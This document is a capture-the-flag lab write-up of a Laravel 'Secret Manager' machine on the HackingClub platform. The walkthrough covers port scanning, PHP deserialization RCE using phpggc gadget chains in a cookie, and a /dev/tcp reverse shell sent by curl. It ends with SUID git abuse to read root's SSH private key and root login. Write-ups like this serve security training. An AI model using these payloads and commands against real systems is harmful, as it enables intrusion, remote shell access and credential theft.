# Locked — HackingClub

## Machine Information

| Attribute  | Value                                   |
| ---------- | --------------------------------------- |
| Platform   | HackingClub                             |
| Machine    | Locked                                  |
| Difficulty | Easy                                    |
| OS         | Linux                                   |
| Category   | Web Exploitation / Privilege Escalation |

---

# Overview

This write-up documents my exploitation process for the **Locked** machine on the **HackingClub** lab platform.

The machine involved the following stages:

* Web enumeration
* Laravel cookie analysis
* PHP deserialization vulnerability
* Remote Code Execution (RCE)
* Reverse shell access
* Linux privilege escalation via **SUID Git**
* Root access using an extracted **SSH private key**

---

# Reconnaissance

The first step was performing a full port scan using **Nmap**.

```bash
nmap -p- -Pn --open --min-rate 1200 172.16.7.199
```

The scan revealed two open ports:

```
22/tcp
80/tcp
```

Next, I performed a more detailed scan.

```bash
nmap -p 22,80 -sVC 172.16.7.199 -vvv
```

Result:

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu
80/tcp open  http    Apache httpd 2.4.58 (Ubuntu)
```

Service summary:

* **SSH** → OpenSSH 9.6p1
* **Web server** → Apache 2.4.58
* **Application title** → Secret Manager

---

# Web Enumeration

Opening the web application in the browser:

```
http://172.16.7.199
```

The page displayed a **login form**.

After creating an account and logging in, the application redirected to:

```
/secrets
```

This page acts as a **dashboard for storing secrets**, allowing users to save notes and credentials.

The interface suggested the application was designed to manage sensitive information such as passwords or private notes.

---

# Cookie Analysis

I inspected the application cookies using **browser DevTools (F12)**.

One cookie revealed the framework used by the application:

```
laravel_session
```

This confirmed the application was built with **Laravel**.

I decoded the cookie using:

```bash
echo "COOKIE_VALUE" | base64 -d
```

Initially, the **`user_session` cookie was not present**, although it was referenced in the lab description.

After experimenting with different actions, I discovered that **logging out and logging back in** caused the application to generate the `user_session` cookie.

---

# Exploitation — PHP Deserialization

The application stores user session information inside the **`user_session` cookie**.

During analysis it became clear that the application **deserializes user-controlled data**, making it vulnerable to **PHP object deserialization**.

To exploit this vulnerability I used the tool **phpggc (PHP Generic Gadget Chains)**.

First, I generated a malicious serialized object that executes the command `id`.

```bash
./phpggc Laravel/RCE1 system "id" | base64 -w0
```

Explanation:

* **phpggc** → generates a malicious serialized PHP object
* **Laravel/RCE1** → gadget chain targeting Laravel applications
* **system "id"** → command that will execute on the server
* **base64 -w0** → encodes the payload so it can be inserted safely into an HTTP cookie

The command returns a **Base64 encoded payload**.

This payload was inserted into the **`user_session` cookie** using the browser developer tools (**F12 → Application → Cookies**).

The original value of the `user_session` cookie was replaced with the malicious payload.

After refreshing the page, the application executed the payload and the following output appeared at the top of the page:

```
uid=33(www-data)
gid=33(www-data)
groups=33(www-data)
```

This confirmed that **Remote Code Execution (RCE)** was successful.

---

# Reverse Shell

After confirming command execution, the next step was obtaining a reverse shell.

First, I started a **netcat listener** on my attacking machine.

```bash
nc -lnvp 443
```

Next, I generated a reverse shell payload using **phpggc**.

```bash
PAYLOAD=$(./phpggc Laravel/RCE1 system "/bin/bash -c 'sh -i >& /dev/tcp/10.0.74.125/443 0>&1'" | base64 -w0)
```

The payload was executed using **curl**, while keeping the valid Laravel session cookies.

Only the `user_session` cookie was replaced with the malicious payload.

```bash
curl -H "Cookie: laravel_session=COOKIE; XSRF-TOKEN=COOKIE; user_session=$PAYLOAD" \
http://172.16.7.208/secrets
```

After sending the request, the netcat listener received the connection, giving a shell on the target machine.

Example commands executed inside the shell:

```bash
id
whoami
```

This confirmed access as:

```
www-data
```

---

# User Flag

After gaining shell access, I searched for the user flag.

The flag was located in the root directory.

```bash
cd /
ls
```

Example file:

```
user_flag_impossible_to_guess.txt
```

Retrieve the flag:

```bash
cat /user_flag_impossible_to_guess.txt
```

---

# Privilege Escalation

Next, I searched for **SUID binaries**.

```bash
find / -perm -4000 2>/dev/null
```

One interesting result appeared:

```
/usr/bin/git
```

Git had the **SUID bit set**, meaning it runs with **root privileges**.

---

# Exploiting SUID Git

Using **GTFOBins**, I found a technique allowing privileged file access.

```bash
git diff /dev/null /root/.ssh/id_rsa
```

This command exposed the **root SSH private key**.

---

# Root Access

I copied the private key to my attacking machine.

```bash
nano id
```

Then set the correct permissions:

```bash
chmod 400 id
```

SSH login:

```bash
ssh -i id root@172.16.7.199
```

Successful access:

```
root@locked
```

---

# Root Flag

The root flag was located in:

```
/root
```

Retrieve it:

```bash
cat /root/root_flag_impossible_to_guess.txt
```

---

# Skills Practiced

* Nmap enumeration
* Web application analysis
* Laravel cookie inspection
* PHP deserialization exploitation
* RCE via phpggc
* Reverse shell techniques
* Shell stabilization
* Linux privilege escalation
* GTFOBins usage

---

# Final Result

Machine successfully compromised.

```
User: root
System: Linux
Platform: HackingClub
Machine: Locked
Difficulty: Easy
```
